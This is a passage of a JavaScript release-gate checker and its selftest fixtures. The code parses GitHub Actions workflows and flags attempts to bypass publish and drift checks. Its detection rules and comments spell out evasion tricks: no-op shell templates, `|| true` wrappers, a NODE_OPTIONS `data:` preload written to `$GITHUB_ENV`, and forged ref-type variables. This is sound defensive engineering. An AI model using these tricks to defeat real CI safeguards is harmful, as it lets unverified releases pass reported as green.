  // gate green.
    // ...AND `npm dist-tag` IS REFUSED OUTRIGHT. Closing the `npm publish --tag` route left the
  // OTHER documented way to write a dist-tag wide open: a plausible "Promote to latest" step
  // running `npm dist-tag add @spec-kitty/tokens@1.0.0 latest` passed every gate and claimed the
  // prod channel. Unlike the `--tag` arms race this closes in one line rather than a pattern to
  // be excused, because the command has no legitimate use in a prerelease payload at all.
  if (RUNS_DIST_TAG_ADD.test(commands)) {
    problems.push(
      `${label} runs \`npm dist-tag add\`, which writes a dist-tag directly and bypasses the ` +
        'publish script entirely — there is no legitimate use for it on either publish path',
    );
  }
  // ...AND NOTHING ELSE MAY PUBLISH. The script is only a guarantee if it is the sole route.
  // THE ONLY INLINE-PUBLISH REFUSAL FOR EITHER JOB. A release-only copy lived in the prod branch until
  // REL3 pass 9, when the reducer measured it as dead weight; stubbing this one reds four probes across
  // both jobs, so it is not the redundant half of a pair — do not delete it looking for a duplicate.
  // THROUGH THE SHARED PREDICATE (REL3 pass 9, reducer): this carried its own hand-spelling — a fourth
  // one, right after the commits that folded three into one, and the one place a future NPM_FLAGS
  // widening would not have reached. The lookahead stays beside it: it tolerates anything at all
  // between `npm` and the subcommand, which is wider still.
  for (const line of commands.split('\n')) {
    if (RUNS_INLINE_PUBLISH.test(line) || /\bnpm\b(?=[^\n;|&]*\bpublish\b)/.test(line)) {
      problems.push(
        `${label} runs \`${line.trim()}\` directly instead of going through ` +
          'the publish script for this stream, which is where the channel refusal lives',
      );
    }
  }
  const REQUIRED_STEPS = jobName === 'release' ? [...PROD_ONLY_STEPS, ...EVERY_STREAM_STEPS] : EVERY_STREAM_STEPS;
  for (const [re, what] of REQUIRED_STEPS) {
    if (!re.test(commands)) problems.push(`${label} has no step running ${what}`);
  }
  // DRIFT CHECKS MUST BE THEIR OWN UNCONDITIONAL STEP, RUN EXACTLY. The presence patterns above
  // are substring matches, and REL4 review measured all three defeats GREEN on the publishing path:
  // `… --check || true`, `echo … --check`, and an `if: false` on the step. (The size check had
  // the same hole from REL2; it is closed with the OpenDesign one.) An exact `run` cannot be
  // chained, echoed or piped, and a step with no `if:` cannot be skipped. Pass 2 then ran the exact
  // command under `shell: sh -c true {0}`, which executes nothing — so a `shell:` on the step, the
  // job's `defaults.run.shell` or the workflow's is refused too: the runner's default shell is the
  // only one under which the exact text means what it says.
  // PASS 2 FOUND TWO MORE. A step that runs the generator in WRITE mode just before the check
  // regenerates whatever it is about to compare, so the check can only pass; and `NODE_OPTIONS`
  // (`--import=data:…process.exit(0)`) makes the exact command exit 0 without running. Neither
  // belongs on a publishing path, so both are refused outright.
  for (const st of steps) {
    const run = typeof st.run === 'string' ? stripShellComments(st.run) : '';
    for (const [script, what] of [['build-opendesign-package.mjs', 'OpenDesign package'], ['measure-elements-sizes.mjs', 'size record']]) {
      for (const inv of run.split(/&&|\|\||;|\||\n/)) {
        if (inv.includes(script) && !/--check\b/.test(inv) && !/--selftest\b/.test(inv)) {
          problems.push(`${label} runs \`${script}\` in write mode ("${inv.trim()}") — it would regenerate the ${what} the drift check then compares`);
        }
      }
    }
  }
  // …AND IN `run:` TEXT, as defence in depth. `echo "NODE_OPTIONS=…" >> "$GITHUB_ENV"` shows in no
  // `env:` block; GitHub's runner currently refuses NODE_OPTIONS from that file (actions/runner
  // FileCommandManager), so this guards a runner change or a self-hosted runner, not a live hole.
  // No publishing step has a reason to name NODE_OPTIONS at all.
  for (const st of steps) {
    if (typeof st.run === 'string' && /NODE_OPTIONS/i.test(stripShellComments(st.run))) {
      problems.push(`${label} step "${st.name ?? st.run}" names NODE_OPTIONS in its run — writing it to $GITHUB_ENV preloads every later node step`);
    }
  }
  const envLevels = [...steps.map((st) => ['step', st.env]), ['job', wf?.jobs?.[jobName]?.env], ['workflow', wf?.env]];
  for (const [where, e] of envLevels) {
    if (e && typeof e === 'object' && Object.keys(e).some((k) => k.toUpperCase() === 'NODE_OPTIONS')) {
      problems.push(`${label} sets NODE_OPTIONS at ${where} level — a preload can make every node check exit 0 without running`);
    }
  }
  const shellOverride = wf?.jobs?.[jobName]?.defaults?.run?.shell ?? wf?.defaults?.run?.shell;
  if (shellOverride !== undefined) {
    problems.push(`${label} overrides the default shell (\`${shellOverride}\`) for the whole job — a shell template can make every exact drift check run nothing`);
  }
  for (const exact of [
    'node scripts/measure-elements-sizes.mjs --check',
    'node scripts/build-opendesign-package.mjs --check',
    // REL3 (#364): the tarballs that get attested and published, and the post-publish byte check.
    'node scripts/pack-derived-set.mjs',
    'node scripts/verify-published-integrity.mjs',
    'node scripts/report-dist-tags.mjs',
    ...(jobName === 'release' ? ['node scripts/publish-latest.mjs'] : []),
  ]) {
    const own = steps.filter((st) => typeof st.run === 'string' && stripShellComments(st.run).trim() === exact);
    if (!own.length) {
      problems.push(`${label} has no step whose run is exactly \`${exact}\` — a chained, echoed or wrapped form passes without gating anything`);
    } else if (own.every((st) => st.if !== undefined)) {
      problems.push(`${label} runs \`${exact}\` only under an \`if:\` — a condition can skip the check while the release proceeds`);
    } else if (own.every((st) => st.if !== undefined || st.shell !== undefined)) {
      problems.push(`${label} runs \`${exact}\` only under a custom \`shell:\` — a shell template such as \`sh -c true {0}\` runs nothing`);
    }
  }
  problems.push(...checkAttestation(wf, jobName, steps, label, stripShellComments));
  if (jobName !== 'release') {
    // THE PUBLISH MUST GO THROUGH THE SCRIPT. Three regex rules used to live here — per-line
    // `--tag`, a hard-coded-`latest` refusal, and a TAG-from-input requirement — and review
    // defeated the set with two lines of shell (`TAG=latest` after the input-derived assignment
    // satisfied all three at once). The refusal now lives in `publish-derived-set.mjs`, which keys
    // `latest` on GITHUB_REF_TYPE — something the runner emits, not something an author types — so
    // the rc stream cannot claim the prod channel however this file is edited.
    //
    // What is left to assert here is exactly two things, and neither is defeatable by prose,
    // because both are about what the job RUNS rather than what it says.
    if (!/publish-derived-set\.mjs/.test(commands)) {
      problems.push(
        `${label} does not publish through scripts/publish-derived-set.mjs — the dist-tag refusal ` +
          'lives in that script, and an inline publish bypasses it entirely',
      );
    }
    // THE HAND-OFF, READ FROM THE PARSED STEP. `/DIST_TAG/.test(workflowText)` asserted that eight
    // characters appear SOMEWHERE in the file — satisfied by a comment, and satisfied by
    // `DIST_TAG: latest` with the input no longer forwarded. Both survived; both would brick the
    // stream at run time rather than leak `latest`, but a gate that certifies a payload which
    // cannot publish is still a gate reporting green over a broken artifact. Fourth occurrence of
    // "a token test standing in for a data-flow assertion" in this file, so it gets the parse.
    // EVERY matching step, not the first. `steps.find` bound all three rules below to whichever
    // step named the script FIRST, so a SECOND step — `run: GITHUB_REF_TYPE=tag node
    // scripts/publish-derived-set.mjs` — was audited by nothing at all. Reproduced against the real
    // workflow: gate green, wiring green, defeat table green. `latest` is unreachable now whatever
    // that second step says, but these rules also carry the `--dry-run` and env-forgery refusals,
    // so binding them to one arbitrary step is wrong on its own terms.
    const publishSteps = steps.filter((st) => /publish-derived-set\.mjs/.test(String(st?.run ?? '')));
    if (publishSteps.length === 0) {
      problems.push(`${label} has no step invoking the publish script`);
    } else if (publishSteps.length > 1) {
      problems.push(
        `${label} invokes the publish script in ${publishSteps.length} steps; exactly one is ` +
          'expected, and extra invocations are audited by nothing',
      );
    }
    for (const publishStep of publishSteps) {
      const handoff = publishStep.env?.DIST_TAG;
      if (typeof handoff !== 'string' || !handoff.includes('inputs.dist-tag')) {
        problems.push(
          `${label}'s publish step does not pass \`env.DIST_TAG: \${{ inputs.dist-tag }}\` ` +
            `(found ${JSON.stringify(handoff ?? null)}) — the caller's dist-tag never reaches the script`,
        );
      }
      // AND IT IS INVOKED BARE. `--dry-run` appended here turns the whole release into a no-op that
      // every gate reports green — the "green line over zero inputs" defect one level up.
      if (!/^\s*node scripts\/publish-derived-set\.mjs\s*$/.test(String(publishStep.run ?? ''))) {
        problems.push(
          `${label}'s publish step must run exactly \`node scripts/publish-derived-set.mjs\` with no ` +
            `arguments (found ${JSON.stringify(String(publishStep.run ?? '').trim())})`,
        );
      }
    }
    // THE PAYLOAD MAY NOT AUTHOR THE SIGNALS ITS OWN GUARD READS. The publish script decides
    // `latest` from GITHUB_REF/GITHUB_REF_TYPE and the runner's event file; a step that sets any of
    // those — or GITHUB_RUN_ATTEMPT, which turns an unexpected first-attempt conflict into a silent
    // "resumption" — is forging the evidence the guard weighs. The bare-invocation rule above
    // already refuses a run-line assignment and a `$GITHUB_ENV` write; this closes the `env:` block
    // at every level.

    // THE BUMP, and its `--from-registry`. Deleting either was green. Nothing commits the bump
    // back to `develop`, so without `--from-registry` every run recomputes the same version and
    // publish #2 dies on EPUBLISHCONFLICT.
    if (!/bump-prerelease\.mjs/.test(commands)) {
      problems.push(`${label} has no step running the prerelease bump — the stream can publish exactly once`);
    } else if (!/bump-prerelease\.mjs[^\n]*--from-registry/.test(commands)) {
      problems.push(
        `${label} runs the bump without \`--from-registry\` — nothing commits the bump back, so ` +
          'every run recomputes the same version and the second publish dies on EPUBLISHCONFLICT',
      );
    }
    // THE FULL ORDERING CHAIN: size-check < bump < publish, asserted over FLATTENED LINE positions
    // rather than step indices. Two defects in the first version, both found by review: it had no
    // upper bound (moving the bump BELOW the publish was green, restoring "publishes exactly
    // once"), and step-index comparison made a same-step violation invisible in both directions —
    // consolidating the bump and the size check into one `run:` block is an ordinary refactor that
    // silently disabled the rule.
    // PER COMMAND, NOT PER LINE. Flattening to line positions closed the same-STEP hole and left a
    // same-LINE one: `node …bump… && node …measure…` on one physical line gave both the same
    // position, so `sizeAt > bumpAt` was false whatever the order. Splitting on shell separators is
    // what makes the comparison mean "runs before".
    const flat = [];
    commandLines.forEach((c, stepIdx) =>
      c.split('\n').forEach((line, lineIdx) =>
        line
          .split(/&&|\|\||;|\|/)
          .forEach((cmd, cmdIdx) => flat.push({ line: cmd, at: stepIdx * 1000000 + lineIdx * 1000 + cmdIdx })),
      ),
    );
    const posOf = (re) => flat.find((f) => re.test(f.line))?.at ?? -1;
    const sizeAt = posOf(/measure-elements-sizes\.mjs\s+--check/);
    const bumpAt = posOf(/bump-prerelease\.mjs/);
    // REL4: the OpenDesign package records the library version, which the bump rewrites — the same
    // ordering hazard as the size record, so it gets the same rule.
    const odAt = posOf(/build-opendesign-package\.mjs\s+--check/);
    if (bumpAt !== -1 && odAt !== -1 && odAt > bumpAt) {
      problems.push(
        `${label} runs the prerelease bump BEFORE \`build-opendesign-package.mjs --check\`; the package ` +
          'records the library version the bump rewrites, so the check would compare against mutated manifests.',
      );
    }
    const publishAt = posOf(/publish-derived-set\.mjs/);
    if (bumpAt !== -1) {
      if (sizeAt === -1) {
        problems.push(`${label} bumps without ever running the size check — the record is then never verified`);
      } else if (sizeAt > bumpAt) {
        problems.push(
          `${label} runs the prerelease bump BEFORE \`measure-elements-sizes.mjs --check\`; the bump ` +
            'mutates the manifests the size record measures, so the check compares the committed ' +
            'record against a tree it can never match. Move the bump below the verification steps.',
        );
      }
      if (publishAt === -1) {
        problems.push(`${label} bumps but never publishes — the bump is then pure tree mutation`);
      } else if (bumpAt > publishAt) {
        problems.push(
          `${label} runs the prerelease bump AFTER the publish, so it publishes the committed ` +
            'version and the next run recomputes the same one — EPUBLISHCONFLICT on publish #2',
        );
      }
    }
  }
  for (const s2 of steps) {
    if (s2['continue-on-error']) problems.push(`${label} step "${s2.name ?? s2.run}" carries continue-on-error`);
  }

  // ANCHORED ON THE INVOCATION, not on the filename appearing anywhere. `check-release-graph.mjs`
  // CONTAINS the substring `release-graph.mjs`, so the [ENFORCED] assertion step this same fold
  // added to release.yml made this test unconditionally true — the deriving step could then be
  // deleted entirely with the gate still green, and `steps.graph.outputs.dirs` on a missing step id
  // resolves to the empty string, so both loops iterate zero times and the release publishes
  // nothing. A lens reproduced exactly that.
  if (!/scripts\/release-graph\.mjs\s+--(projects|dirs|json)\b/.test(commands)) {
    problems.push('release.yml never invokes scripts/release-graph.mjs to derive the set');
  }
  if (!/id:\s*graph\b/.test(workflowText)) {
    problems.push(
      `${label} has no step with \`id: graph\` — the \`steps.graph.outputs.*\` references below ` +
        'resolve to the empty string',
    );
  }
  for (const key of ['outputs.projects', 'outputs.dirs']) {
    if (!commands.includes(key)) {
      problems.push(`${label} does not consume steps.graph.${key}`);
    }
  }
  // A hand-written enumeration is two or more package identifiers in one run block.
  //
  // LOOKAROUNDS, not a trailing character class. The first draft used `([\s,"'/]|$)` and the
  // selftest caught it: in `for p in tokens styles; do`, `styles` is followed by `;`, so only one
  // of the two names matched and the `>= 2` test never fired. Enumerating the delimiters that may
  // follow a package name in shell is a losing game — `;` `)` `&` `|` `"` all qualify. Negate the
  // characters that may NOT, instead.
  //
  // The lookbehind also stops `@spec-kitty/tokens` from being counted twice, once for the full
  // name and once for the bare `tokens` inside it: that `tokens` is preceded by `/`.
  // ONE hand-written per-package step is already the failure mode — the original release.yml had
  // exactly two, and neither enumerated anything. So a `working-directory: packages/<x>` is a hit
  // on its own, without needing a second name in the same block.
  const perPackage = runs.filter((r) => r.isPerPackageDir);
  if (perPackage.length) {
    problems.push(
      `${label} has ${perPackage.length} step(s) with a per-package \`working-directory\` ` +
        `(${perPackage.map((r) => r.name).join(', ')}) — that is one hand-written step per package, ` +
        `which is how the three lists drifted apart. Loop over the derived set instead.`,
    );
  }

  const ids = [...packageNames, ...packageDirs];
  for (const r of runs) {
    // Strip only the LINES that invoke the deriving script, not the whole block. Skipping the
    // block let a lens reintroduce a full hand-written publish loop simply by adding a no-op
    // `node scripts/release-graph.mjs --dirs > /dev/null` line beside it.
    // Shell comments are prose; a package named in one is documentation, not a second list.
    const code = r.run
      .split('\n')
      .filter((l) => !/^\s*#/.test(l) && !l.includes('release-graph.mjs'))
      .join('\n');
    const named = [...new Set(ids.filter((id) => new RegExp(`(?<![\\w@/-])${escapeRe(id)}(?![\\w/-])`).test(code)))];
    if (named.length >= 2) {
      problems.push(
        `${label} step "${r.name}" names ${named.length} packages literally (${named.join(', ')}) — ` +
          `that is a second list beside the derived one, which is how the three lists drifted apart`,
      );
    }
  }
  return problems;
}

/**
 * FR-008 — the CHANGELOG's element list matches the manifest.
 *
 * The acceptance matrix claimed this list was "derived-and-checked against custom-elements.json
 * rather than hand-written". A lens checked: NOTHING in the repo reads CHANGELOG.md. The list was
 * correct on the day it was written with nothing keeping it correct — the drift shape this whole
 * mission is about, recorded as if it were automated. Rather than weaken the claim to match the
 * code, here is the code that makes the claim true.
 */
export function checkChangelogTagsMatchManifest(changelogText, manifestTags) {
  const problems = [];
  if (manifestTags.length === 0) {
    return ['no tags found in custom-elements.json — refusing to compare the CHANGELOG against nothing'];
  }
  const listed = [...new Set([...changelogText.matchAll(/`(sk-[a-z][a-z0-9-]*)`/g)].map((m) => m[1]))];
  if (listed.length === 0) {
    return ['CHANGELOG.md names no `sk-*` element — refusing to certify a match over an empty list'];
  }
  const missing = manifestTags.filter((t) => !listed.includes(t));
  const extra = listed.filter((t) => !manifestTags.includes(t));
  if (missing.length) problems.push(`CHANGELOG.md does not mention: ${missing.join(', ')}`);
  if (extra.length) problems.push(`CHANGELOG.md names elements that are not in the manifest: ${extra.join(', ')}`);
  return problems;
}

/**
 * SC-004, widened — no hand-written package list in ANY workflow.
 *
 * checkWorkflowUsesDerivedSet reads release.yml only. The commit that introduced it announced
 * "a FOURTH hand-written list turned up in ci-quality.yml" and fixed that one by hand — leaving
 * it guarded by nothing. A lens then found two more, in storybook-deploy.yml and pr-preview.yml.
 * Six lists, three of them outside the one file the check could see.
 *
 * So the scan is over every workflow. release.yml keeps its own deeper check (required payload
 * steps, per-package working-directory); this is the floor that applies everywhere.
 */
export function checkNoHandWrittenListsAnywhere(workflows, packageNames, packageDirs) {
  const problems = [];
  if (workflows.length === 0) {
    return ['no workflow files found — refusing to certify the absence of hand-written lists over nothing'];
  }
  const ids = [...packageNames, ...packageDirs];
  const names = (text) =>
    [...new Set(ids.filter((id) => new RegExp(`(?<![\\w@/-])${escapeRe(id)}(?![\\w/-])`).test(text)))];

  // EVERY PLACE A LIST CAN LIVE. The first version read `st.run` and nothing else, while its
  // release.yml sibling already folded in name/working-directory/env/with — so the check that
  // exists BECAUSE three lists were found outside release.yml was the weaker of the two. A lens
  // walked a package list past it through `strategy.matrix`, a step `with:`, a step `env:`, a
  // job-level `env:`, a per-package `working-directory`, and a composite action, all green.
  const scalars = (node, out = []) => {
    if (typeof node === 'string' || typeof node === 'number') out.push(String(node));
    else if (Array.isArray(node)) node.forEach((n) => scalars(n, out));
    else if (node && typeof node === 'object') Object.values(node).forEach((n) => scalars(n, out));
    return out;
  };

  for (const { file, text } of workflows) {
    const wf = parse(text);
    for (const [jobName, job] of Object.entries(wf?.jobs ?? {})) {
      // Job-level env and the build matrix, which is the idiomatic way to write a per-package list.
      const jobLevel = scalars([job?.env, job?.strategy?.matrix]).join('\n');
      const jobNamed = names(jobLevel);
      if (jobNamed.length >= 2) {
        problems.push(
          `${file} job "${jobName}" names ${jobNamed.length} packages in its env/matrix ` +
            `(${jobNamed.join(', ')}) — derive the list with scripts/release-graph.mjs instead`,
        );
      }
      for (const st of job?.steps ?? []) {
        const wd = st?.['working-directory'];
        if (typeof wd === 'string' && /^packages\/[^/]+\/?$/.test(wd)) {
          problems.push(
            `${file} job "${jobName}" step "${st.name ?? '(unnamed)'}" has a per-package ` +
              `\`working-directory: ${wd}\` — one hand-written step per package is the shape this rejects`,
          );
        }
        // The whole step, minus the lines that invoke the deriving script and minus comments.
        const stepScalars = scalars([st.name, st.run, wd, st.env, st.with, st.uses]).join('\n');
        const code = stepScalars
          .split('\n')
          .filter((l) => !/^\s*#/.test(l) && !l.includes('release-graph.mjs'))
          .join('\n');
        const named = names(code);
        if (named.length >= 2) {
          problems.push(
            `${file} job "${jobName}" step "${st.name ?? '(unnamed)'}" names ${named.length} packages ` +
              `literally (${named.join(', ')}) — derive the list with scripts/release-graph.mjs instead`,
          );
        }
      }
    }
  }
  return problems;
}

/**
 * NFR-001 / SC-003 — the REAL accessors refuse an empty set.
 *
 * The first version of this took the accessors and called them on the live tree, where they
 * return four and three packages, so its "returned an empty array" branch was unreachable by
 * construction. Three lenses found it independently, and one proved the consequence: deleting
 * both `throw` blocks in release-graph.mjs left this file printing 14/14 probes green.
 *
 * So it builds a real fixture tree — a packages/ directory containing only private packages,
 * and one containing nothing at all — and asserts the real functions THROW on it. `scan()`
 * takes an injectable root for exactly this and for nothing else.
 */
export function checkGraphFailsClosed(accessors) {
  const problems = [];
  const fixtures = [];
  const mk = (name, build) => {
    const dir = mkdtempSync(join(tmpdir(), `sk-graph-${name}-`));
    build(dir);
    fixtures.push(dir);
    return dir;
  };

  const allPrivate = mk('private', (dir) => {
    for (const n of ['a', 'b']) {
      mkdirSync(join(dir, n), { recursive: true });
      writeFileSync(join(dir, n, 'package.json'), JSON.stringify({ name: `@x/${n}`, version: '1.0.0', private: true }));
    }
  });
  const noBuild = mk('nobuild', (dir) => {
    mkdirSync(join(dir, 'a'), { recursive: true });
    writeFileSync(join(dir, 'a', 'package.json'), JSON.stringify({ name: '@x/a', version: '1.0.0' }));
  });
  const empty = mk('empty', () => {});

  const mustThrow = (label, fn) => {
    try {
      const v = fn();
      problems.push(
        `release-graph.${label} did NOT throw on ${label.includes('empty') ? 'an empty' : 'a degenerate'} ` +
          `package tree — it returned ${JSON.stringify(Array.isArray(v) ? v.map((p) => p.name) : v)}`,
      );
    } catch (err) {
      // A BARE catch scored `TypeError: accessors.buildable is not a function` as success, so an
      // incomplete stub proved the contract it was meant to test. A lens caught it.
      if (err instanceof TypeError) {
        problems.push(`release-graph.${label} threw a TypeError (${err.message}) — that is a broken probe, not a refusal`);
      }
    }
  };

  mustThrow('publishable(all-private)', () => accessors.publishable(allPrivate));
  mustThrow('publishable(empty-tree)', () => accessors.publishable(empty));
  mustThrow('buildable(no-build-target)', () => accessors.buildable(noBuild));

  for (const d of fixtures) rmSync(d, { recursive: true, force: true });
  return problems;
}

/* ─────────────────────────────────── helpers ─────────────────────────────────── */

function escapeRe(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/** Every string leaf of an `exports` map, whatever its condition nesting. */
export function collectExportTargets(exp) {
  const out = [];
  const walk = (node) => {
    if (typeof node === 'string') out.push(node);
    else if (node && typeof node === 'object') Object.values(node).forEach(walk);
  };
  walk(exp);
  return out;
}

/** `npm pack --dry-run --json` for one package — file list without writing a tarball, no registry. */
function packOne(pkg) {
  const dir = join(ROOT, 'packages', pkg.dir);
  const raw = execFileSync('npm', ['pack', '--dry-run', '--json'], { cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  const parsed = JSON.parse(raw);
  const entry = Array.isArray(parsed) ? parsed[0] : parsed;
  const manifest = JSON.parse(readFileSync(join(dir, 'package.json'), 'utf8'));
  // `unpackedSize` and `dir` are deliberately NOT carried here. measure-elements-sizes.mjs runs
  // its own pack sweep for the committed record — a lens asked whether that duplication should be
  // collapsed. It should not: this script must keep working when the record does not exist yet
  // (it runs before it on a fresh clone), and it is a gate rather than a generator. Two sweeps
  // cost ~3.5s in a job that also installs chromium. Carrying fields nothing reads is the part
  // that was wrong, so they are gone.
  return {
    name: pkg.name,
    files: (entry.files ?? []).map((f) => f.path),
    size: entry.size,
    exports: manifest.exports,
    main: manifest.main,
    types: manifest.types,
    module: manifest.module,
    browser: typeof manifest.browser === 'string' ? manifest.browser : undefined,
  };
}

/* ─────────────────────────────────── selftest ─────────────────────────────────── */

/**
 * A release job that SHOULD pass, so each workflow probe can inject exactly one defect.
 *
 * The workflow probes used to be hand-built fragments that were invalid in several ways at once,
 * so every one of them tripped on `REQUIRED_STEPS` regardless of its stated subject. A lens
 * mutation-tested it: deleting the per-package `working-directory` check, or the
 * `continue-on-error` check, stopped NO probe from tripping — two of this file's newest and most
 * specific checks had zero discriminating coverage while the floor counted them as proven.
 *
 * Starting from a valid baseline is what makes a probe mean "this defect is caught" rather than
 * "this fixture is invalid somehow".
 */
const VALID_RELEASE_WORKFLOW = `permissions:
  contents: write
  packages: write
  id-token: write
  attestations: write
jobs:
  release:
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
        with: { fetch-depth: 0, persist-credentials: false }
      - name: Security
        run: bash scripts/npm-audit-gate.sh
      - name: Report
        run: node scripts/report-dist-tags.mjs
      - name: Resolve the publishable package set
        id: graph
        run: |
          PROJECTS="$(node scripts/release-graph.mjs --projects)"
          DIRS="$(node scripts/release-graph.mjs --dirs)"
          echo "projects=$PROJECTS" >> "$GITHUB_OUTPUT"
          echo "dirs=$DIRS" >> "$GITHUB_OUTPUT"
      - name: Build
        run: npx --no-install nx run-many --target=build --projects=\${{ steps.graph.outputs.projects }}
      - name: Assert
        run: node scripts/check-release-graph.mjs
      - name: Selftest
        run: node scripts/check-release-graph.mjs --selftest
      - name: Packed Vue declarations
        run: node scripts/check-vue-packed-types.mjs
      - name: Sizes
        run: node scripts/measure-elements-sizes.mjs --check
      - name: OpenDesign
        run: node scripts/build-opendesign-package.mjs --check
      - name: Audit
        run: |
          for pkg in \${{ steps.graph.outputs.dirs }}; do ( cd "packages/$pkg" && npm pack --dry-run ); done
      - name: SBOM
        run: npx --no-install @cyclonedx/cyclonedx-npm --output-file sbom.json
      - name: Pack
        run: node scripts/pack-derived-set.mjs
      - name: Attest
        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8
        with:
          subject-path: 'dist-tarballs/*.tgz'
      - name: Publish
        run: node scripts/publish-latest.mjs
      - name: Verify
        env:
          GH_TOKEN: \${{ github.token }}
          SIGNER_WORKFLOW: spec-kitty/spec-kitty-design/.github/workflows/release.yml
          SOURCE_DIGEST: \${{ github.sha }}
        run: node scripts/verify-published-integrity.mjs
`;

/**
 * The baseline plus one injected defect.
 *
 * THROWS if the anchor is not found. A silent no-op here would hand every probe the pristine
 * baseline, which passes — so the probe would report "did not trip" for the wrong reason, or worse,
 * a future edit to the baseline would quietly disarm probes while the count stayed at 24. That is
 * the same certifying-absence shape this whole file is about, one level up in the test harness.
 */
/**
 * A minimal, VALID reusable publish payload — the `publish` job shape, carrying the five gates
 * every stream must run plus a publish. Probes mutate a copy of it; the pristine form must pass,
 * or a probe would red for the wrong reason.
 *
 * Deliberately NOT built from the real file: a fixture that reads the artifact it guards passes
 * whenever they drift together, which is the co-edited-baseline defect recorded elsewhere in this
 * repo.
 */
const REUSABLE_PAYLOAD_FIXTURE = `jobs:
  publish:
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
        with: { fetch-depth: 0, persist-credentials: false }
      - name: Resolve
        id: graph
        run: |
          PROJECTS="$(node scripts/release-graph.mjs --projects)"
          DIRS="$(node scripts/release-graph.mjs --dirs)"
          echo "projects=\${PROJECTS}" >> "$GITHUB_OUTPUT"
          echo "dirs=\${DIRS}" >> "$GITHUB_OUTPUT"
      - name: Build
        run: npx --no-install nx run-many --target=build --projects=\${{ steps.graph.outputs.projects }}
      - name: Selftest
        run: node scripts/check-release-graph.mjs --selftest
      - name: Assert
        run: node scripts/check-release-graph.mjs
      - name: Vue
        run: node scripts/check-vue-packed-types.mjs
      - name: Sizes
        run: node scripts/measure-elements-sizes.mjs --check
      - name: OpenDesign
        run: node scripts/build-opendesign-package.mjs --check
      - name: Audit
        run: |
          for pkg in \${{ steps.graph.outputs.dirs }}; do ( cd "packages/$pkg" && npm pack --dry-run ); done
      - name: Security
        run: bash scripts/npm-audit-gate.sh
      - name: Report
        run: node scripts/report-dist-tags.mjs
      - name: Bump
        run: node scripts/bump-prerelease.mjs --from-registry
      - name: Pack
        run: node scripts/pack-derived-set.mjs
      - name: Attest
        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8
        with:
          subject-path: 'dist-tarballs/*.tgz'
      - name: Publish
        env:
          DIST_TAG: \${{ inputs.dist-tag }}
        run: node scripts/publish-derived-set.mjs
      - name: Verify
        env:
          GH_TOKEN: \${{ github.token }}
          SIGNER_WORKFLOW: spec-kitty/spec-kitty-design/.github/workflows/publish-packages.yml
          SOURCE_DIGEST: \${{ github.sha }}
        run: node scripts/verify-published-integrity.mjs
`;

/** A caller fixture, for the delegation checks. Mirrors release-rc.yml's real shape. */
const VALID_CALLER_FIXTURE = `on:
  push:
    branches: [develop]
jobs:
  rc:
    uses: ./.github/workflows/publish-packages.yml
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    with:
      registry: '${GH_PACKAGES}'
      dist-tag: rc
      bump: true
`;

const withDefect = (anchor, withText) => {
  const out = VALID_RELEASE_WORKFLOW.replace(anchor, withText);
  if (out === VALID_RELEASE_WORKFLOW) {
    throw new Error(`probe anchor not found in the baseline workflow: ${String(anchor).slice(0, 60)}`);
  }
  return out;
};

/**
 * The payload fixture's `withDefect`. It did not have one: the three REL2 probes called `.replace()`
 * raw, so an anchor that stopped matching made the "mutant" identical to the pristine fixture and
 * the probe certified nothing — while a comment claimed the case "is asserted below rather than
 * trusted". It was not. A lens broke the fixture, deleted the guard, and watched the probe report
 * itself as passing.
 */
const withPayloadDefect = (anchor, withText) => {
  const out = REUSABLE_PAYLOAD_FIXTURE.replace(anchor, withText);
  if (out === REUSABLE_PAYLOAD_FIXTURE) {
    throw new Error(`probe anchor not found in the payload fixture: ${String(anchor).slice(0, 60)}`);
  }
  return out;
};

const withCallerDefect = (anchor, withText) => {
  const out = VALID_CALLER_FIXTURE.replace(anchor, withText);
  if (out === VALID_CALLER_FIXTURE) {
    throw new Error(`probe anchor not found in the caller fixture: ${String(anchor).slice(0, 60)}`);
  }
  return out;
};

// Set from the table's own reported count, never from arithmetic — see the floor's own comment
// in selftest(). Raise it in the SAME commit that adds probes.
// HISTORY, because the number moved both ways and a stale headline on this comment was itself a
// review finding (REL3 pass 4): 123 -> 116 deliberately, then up as probes were added — 118, 125,
// 130, 136, 143, and now 145. Ten probes policed the prod publish's inline shell loop
// (FILES source, reassignment, `read`, a second loop, the loop variable, a directory publish, a bare
// publish, a missing `--tag latest`, an appended path, the loop's list). REL3 review showed that surface
// could not be closed by rules over shell text, so the loop was replaced by scripts/publish-latest.mjs,
// whose own effect probes cover those behaviours by running it. Three probes here hold the workflow to
// that script (inline publish refused, `|| true` refused, the loop restored refused).
const PROBE_FLOOR = 220;

const VALID_RELEASE_TRIGGER = "on:\n  push:\n    tags: ['v*.*.*']\n";
const withTrigger = (from, to) => {
  if (!VALID_RELEASE_TRIGGER.includes(from)) throw new Error(`trigger probe anchor not found: ${from}`);
  return checkReleaseTrigger(VALID_RELEASE_TRIGGER.replace(from, to), 'release.yml');
};

const PROBES = [
  {
    // REL3 pass 5, debugger: skipping any url containing `${{` made this GREEN, where the mission's
    // own base refused it. The expression is stripped now, and the literal remainder is checked.
    what: 'REL3: an npmjs repoint hidden behind an empty GitHub expression',
    run: () =>
      checkRegistryAuthorityAgrees(
        [{ name: '@spec-kitty/tokens', publishConfig: { registry: 'https://npm.pkg.github.com' } }],
        [
          { file: '.github/workflows/publish-packages.yml', text: 'jobs:\n  publish:\n    steps:\n      - uses: actions/setup-node@x\n        with:\n          registry-url: "${{ \'\' }}https://registry.npmjs.org"\n      - run: node scripts/publish-derived-set.mjs\n' },
          { file: '.github/workflows/release.yml', text: "jobs:\n  release:\n    steps:\n      - uses: actions/setup-node@x\n        with:\n          registry-url: 'https://npm.pkg.github.com'\n      - run: node scripts/publish-latest.mjs\n" },
        ],
      ),
  },
  {
    // A FLAG BEFORE THE SUBCOMMAND: measured on this npm, `npm --loglevel=error publish` publishes.
    what: 'REL3: `npm publish` behind a flag, inside the audited release job',
    run: () =>
      checkWorkflowUsesDerivedSet(
